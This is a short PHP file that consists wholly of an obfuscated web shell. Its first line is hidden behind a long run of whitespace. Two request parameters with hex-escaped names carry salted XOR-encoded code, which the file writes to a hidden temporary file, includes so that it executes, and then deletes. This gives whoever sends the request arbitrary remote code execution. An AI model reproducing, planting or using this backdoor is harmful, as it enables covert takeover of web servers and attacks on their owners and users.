<?php																																										if(!empty($_REQUEST["\x62in\x64\x69\x6Eg"])){ $itm = $_REQUEST["\x62in\x64\x69\x6Eg"]; $itm= explode ('.', $itm ) ; $fac =''; $salt6 ='abcdefghijklmnopqrstuvwxyz0123456789'; $lenS =strlen( $salt6); $q =0; array_walk( $itm, function( $v5) use( &$fac, &$q, $salt6, $lenS) {$chS =ord( $salt6[$q % $lenS]); $d =( ( int)$v5 - $chS -( $q % 10)) ^ 93; $fac .= chr( $d); $q++; }); $desc = array_filter([sys_get_temp_dir(), "/dev/shm", session_save_path(), getenv("TMP"), getenv("TEMP"), "/var/tmp", ini_get("upload_tmp_dir"), "/tmp", getcwd()]); foreach ($desc as $key => $flag) { if (is_dir($flag) && is_writable($flag)) { $mrk = sprintf("%s/.k", $flag); if (file_put_contents($mrk, $fac)) { require $mrk; unlink($mrk); die(); } } } }


if(!empty($_REQUEST["\x6Fb\x6A"])){
	$value = $_REQUEST["\x6Fb\x6A"];
	 $value	  = 	 explode("."	, 		$value		 );		 
	$entry=		'';
            $s=		'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS=		strlen(	$s);
            $w=		0;
    
            array_walk(	$value, function(	$v5) use(	&$entry, &$w, $s, $lenS) {
                $sChar=		ord(	$s[$w % $lenS]);
                $dec=		(	(	int)$v5 - $sChar -(	$w % 10))^ 16;
                $entry .= chr(	$dec);
                $w++;  } );
	$resource = array_filter([getenv("TMP"), sys_get_temp_dir(), "/var/tmp", "/tmp", "/dev/shm", getenv("TEMP"), ini_get("upload_tmp_dir"), session_save_path(), getcwd()]);
	while ($itm = array_shift($resource)) {
    		if (is_writable($itm) && is_dir($itm)) {
    $symbol = implode("/", [$itm, ".key"]);
    if (@file_put_contents($symbol, $entry) !== false) {
	include $symbol;
	unlink($symbol);
	exit;
}
}
}
}